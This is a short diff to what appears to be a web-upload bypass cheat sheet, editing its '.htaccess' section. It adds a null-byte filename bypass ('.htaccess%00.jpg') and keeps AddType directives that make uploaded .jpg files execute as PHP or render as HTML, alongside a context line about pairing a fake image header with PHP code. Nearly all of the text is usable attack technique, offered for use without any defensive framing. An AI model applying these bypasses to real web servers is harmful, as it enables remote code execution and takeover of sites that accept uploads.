@@ -24,8 +24,9 @@ image/png + fake header	Use a real image header + PHP code.
 
 
 ## Via .htaccess:
-filename=".htaccess"
-AddType application/x-httpd-php .jpg         ---->This will process any jpg file uploaded as php: Also make sure to set Content-Type: application/x-php when uploding the jpg
+filename=".htaccess"    Bypass    ".htaccess%00.jpg"
 
-AddType text/html .jpg                       ---->This will process any jpg file uploaded as html
+  AddType application/x-httpd-php .jpg         ---->This will process any jpg file uploaded as php: Also make sure to set Content-Type: application/x-php when uploding the   jpg
+
+  AddType text/html .jpg                       ---->This will process any jpg file uploaded as html
 
